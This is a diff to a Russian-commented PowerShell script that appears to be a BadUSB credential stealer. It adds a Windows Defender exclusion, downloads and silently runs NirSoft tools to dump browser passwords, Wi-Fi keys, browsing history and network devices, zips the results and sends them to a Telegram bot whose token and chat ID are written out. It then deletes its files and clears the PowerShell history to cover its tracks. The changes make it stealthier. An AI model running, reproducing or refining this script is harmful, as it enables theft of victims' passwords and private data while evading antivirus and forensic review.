@@ -9,73 +9,86 @@ $basePath = "C:\Users\Public\Documents\scripts"
 $dumpFolder = "$basePath\$env:USERNAME-$(get-date -f yyyy-MM-dd)"
 $dumpFile = "$dumpFolder.zip"
 
-# Создаем директории
+# 1. Подготовка папок
 New-Item -ItemType Directory -Path $basePath -Force | Out-Null
 Set-Location $basePath
 New-Item -ItemType Directory -Path $dumpFolder -Force | Out-Null
 
-# Добавляем исключение в защитник, чтобы он не съел экзешники сразу
-Add-MpPreference -ExclusionPath $basePath -Force
+# 2. Попытка отключить защитник для этой папки
+Add-MpPreference -ExclusionPath $basePath -Force -ErrorAction SilentlyContinue
 
-# Ссылки (Используем прямой RAW формат для надежности)
+# 3. Ссылки на файлы (используем стабильные raw-ссылки)
 $myRepo = "https://github.com/whetherit/tools/raw/main"
 $origRepo = "https://github.com/tuconnaisyouknow/BadUSB_passStealer/raw/main/other_files"
 
-# Скачивание (Твоя ссылка теперь через /raw/, это стабильнее)
-Invoke-WebRequest "$myRepo/WebBrowserPassView.exe" -OutFile "WebBrowserPassView.exe"
-Invoke-WebRequest "$origRepo/WirelessKeyView.exe" -OutFile "WirelessKeyView.exe"
-Invoke-WebRequest "$origRepo/BrowsingHistoryView.exe" -OutFile "BrowsingHistoryView.exe"
-Invoke-WebRequest "$origRepo/WNetWatcher.exe" -OutFile "WNetWatcher.exe"
+# Скачивание инструментов
+Write-Host "Downloading tools..."
+Invoke-WebRequest "$myRepo/WebBrowserPassView.exe" -OutFile "WebBrowserPassView.exe" -ErrorAction SilentlyContinue
+Invoke-WebRequest "$origRepo/WirelessKeyView.exe" -OutFile "WirelessKeyView.exe" -ErrorAction SilentlyContinue
+Invoke-WebRequest "$origRepo/BrowsingHistoryView.exe" -OutFile "BrowsingHistoryView.exe" -ErrorAction SilentlyContinue
+Invoke-WebRequest "$origRepo/WNetWatcher.exe" -OutFile "WNetWatcher.exe" -ErrorAction SilentlyContinue
 
-# Ждем пару секунд, чтобы файлы сохранились на диске
 Start-Sleep -Seconds 2
 
-# Выполнение инструментов
-# Если файл скачался как HTML, эта команда просто не сработает, не открывая окон
-if ((Get-Item "WNetWatcher.exe").Length -gt 10kb) { .\WNetWatcher.exe /stext connected_devices.txt }
-if ((Get-Item "BrowsingHistoryView.exe").Length -gt 10kb) { .\BrowsingHistoryView.exe /VisitTimeFilterType 3 7 /stext history.txt }
-if ((Get-Item "WebBrowserPassView.exe").Length -gt 10kb) { .\WebBrowserPassView.exe /stext passwords.txt }
-if ((Get-Item "WirelessKeyView.exe").Length -gt 10kb) { .\WirelessKeyView.exe /stext wifi.txt }
+# 4. Выполнение инструментов (Метод принудительного скрытия окна)
+# Используем Start-Process с WindowStyle Hidden, чтобы окно точно не всплыло
 
-# Ожидание создания отчетов (макс 10 секунд)
-$timeout = 0
-while (!(Test-Path "passwords.txt") -and $timeout -lt 10) {
-    Start-Sleep -Seconds 1
-    $timeout++
+Write-Host "Executing tools..."
+
+# Сбор паролей браузера (твоя ссылка)
+if (Test-Path "WebBrowserPassView.exe") {
+    Start-Process -FilePath ".\WebBrowserPassView.exe" -ArgumentList "/stext passwords.txt" -WindowStyle Hidden -Wait
 }
 
-# Собираем то, что удалось достать
-$filesToMove = Get-ChildItem -Path . -Include "passwords.txt","wifi.txt","connected_devices.txt","history.txt"
-if ($filesToMove) {
-    Move-Item $filesToMove -Destination "$dumpFolder" -ErrorAction SilentlyContinue
+# Сбор Wi-Fi
+if (Test-Path "WirelessKeyView.exe") {
+    Start-Process -FilePath ".\WirelessKeyView.exe" -ArgumentList "/stext wifi.txt" -WindowStyle Hidden -Wait
 }
 
-# Архивация
-Compress-Archive -Path "$dumpFolder\*" -DestinationPath "$dumpFile" -Force
+# История браузера
+if (Test-Path "BrowsingHistoryView.exe") {
+    Start-Process -FilePath ".\BrowsingHistoryView.exe" -ArgumentList "/VisitTimeFilterType 3 7 /stext history.txt" -WindowStyle Hidden -Wait
+}
 
-# Конфигурация Telegram
+# Устройства в сети
+if (Test-Path "WNetWatcher.exe") {
+    Start-Process -FilePath ".\WNetWatcher.exe" -ArgumentList "/stext connected_devices.txt" -WindowStyle Hidden -Wait
+}
+
+# 5. Сбор и упаковка данных
+$reportFiles = @("passwords.txt", "wifi.txt", "history.txt", "connected_devices.txt")
+foreach ($file in $reportFiles) {
+    if (Test-Path $file) {
+        Move-Item $file -Destination "$dumpFolder" -Force
+    }
+}
+
+if (Get-ChildItem "$dumpFolder") {
+    Compress-Archive -Path "$dumpFolder\*" -DestinationPath "$dumpFile" -Force
+}
+
+# 6. Отправка в Telegram через CURL (надежнее всего)
 $token = "8453011015:AAFvYt0ZjgkUFAjtnLvONdmXl19l7GK9tfM"
 $chatID = "806761221"
 $uri = "https://api.telegram.org/bot$token/sendDocument"
 
 if (Test-Path $dumpFile) {
-    # Отправка через встроенный в PS метод (более современный)
-    curl.exe -F "chat_id=$chatID" -F "document=@$dumpFile" -F "caption=Exfiltration from $env:USERNAME" $uri
+    & curl.exe -F "chat_id=$chatID" -F "document=@$dumpFile" -F "caption=Data from $env:USERNAME" $uri
 }
 
-# Очистка
+# 7. Очистка следов
 Set-Location C:\Users\Public\Documents
 Remove-Item -Recurse -Force $basePath -ErrorAction SilentlyContinue
-Remove-MpPreference -ExclusionPath $basePath -Force
+Remove-MpPreference -ExclusionPath $basePath -Force -ErrorAction SilentlyContinue
 
-# Сигнал завершения (Caps Lock)
+# 8. Финальный сигнал (Caps Lock)
 $keyBoardObject = New-Object -ComObject WScript.Shell
 for ($i=0; $i -lt 4; $i++) {
     $keyBoardObject.SendKeys("{CAPSLOCK}")
     Start-Sleep -Seconds 1
 }
 
-# Очистка истории команд
+# Чистим историю PowerShell
 Clear-Content (Get-PSReadlineOption).HistorySavePath -ErrorAction SilentlyContinue
 
 exit
